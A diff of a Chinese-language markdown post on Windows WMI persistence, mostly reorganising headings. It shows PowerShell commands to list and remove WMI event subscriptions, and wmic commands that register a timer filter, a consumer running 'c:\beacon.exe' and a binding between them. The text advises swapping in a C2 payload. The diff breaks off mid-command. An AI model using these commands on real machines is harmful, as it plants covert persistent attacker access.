@@ -7,75 +7,73 @@ tags:
   - WMI
   - Windows
   - Persistence
+slug: English-Preview
 ---
+> Persistence WMI
+<!--more-->
+# WMI
 
-## 0x00 前言
+## 查询事件
 
-Persistence WMI
-
-## 0x01 WMI
-
-### 查询事件
-
-#### 列出事件过滤器
+### 列出事件过滤器
 
 ```powershell
 Get-WMIObject -Namespace root\Subscription -Class __EventFilter
 ```
 
-#### 列出事件消费者
+### 列出事件消费者
 
 ```powershell
 Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
 ```
 
-#### 列出事件绑定
+### 列出事件绑定
 
 ```powershell
 Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
 ```
 
-### 删除事件
+## 删除事件
 
-#### 删除事件过滤器
+### 删除事件过滤器
 
 ```powershell
 Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='事件过滤器名'" | Remove-WmiObject -Verbose
 ```
 
-#### 删除事件消费者
+### 删除事件消费者
 
 ```powershell
 Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='事件消费者名'" | Remove-WmiObject -Verbose
 ```
 
-#### 删除事件绑定
+### 删除事件绑定
 
 ```powershell
 Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%事件绑定名%'" | Remove-WmiObject -Verbose
 ```
 
-## 0x02 利用原理
+# 利用原理
 
-### WMI永久事件
+## WMI永久事件
 
 注意：没有指定时间轮询则需要机器重启才可以进行WMI轮询，需要注意的一点是，WMI可以任意指定触发条件，例如用户退出，某个程序创建，结束等等。
 
 注意：可以考虑添加Powershell的时间间隔器，需要上线至C2则将Payload替换成C2的exe或者dll或者ps1即可
 
-#### 注册一个 WMI 事件过滤器
+### 注册一个 WMI 事件过滤器
 
 ```cmd
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'BugSecFilter'"
 ```
 
-#### 注册一个 WMI 事件消费者
+### 注册一个 WMI 事件消费者
 
 ```cmd
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c  c:\beacon.exe"
 ```
 
-#### 将事件消费者绑定到事件过滤器
+### 将事件消费者绑定到事件过滤器
 
 ```cmd
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
@@ -96,9 +94,9 @@ wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name=
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
 ```
 
-### 定时执行
+## 定时执行
 
-#### Step 1
+### Step 1
 
 - `/NAMESPACE:"\\root\subscription"`: 指定 WMI 命名空间为 "\root\subscription"，这是用于访问事件订阅相关信息的命名空间
 - `PATH __EventFilter CREATE`: 创建一个名为 "__EventFilter" 的对象，该对象是事件筛选器
@@ -118,7 +116,7 @@ wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter8
 ModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 ```
 
-#### Step 2
+### Step 2
 
 ```cmd
 # Usage
@@ -134,7 +132,7 @@ otConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTempl
 - `ExecutablePath="C:\Windows\System32\notepad.exe"`: 指定可执行文件路径为 "C:\Windows\System32\notepad.exe"
 - `CommandLineTemplate="C:\Windows\System32\notepad.exe"`: 指定命令行参数模板为 "C:\Windows\System32\notepad.exe"
 
-#### Step 3
+### Step 3
 
 ```cmd
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter
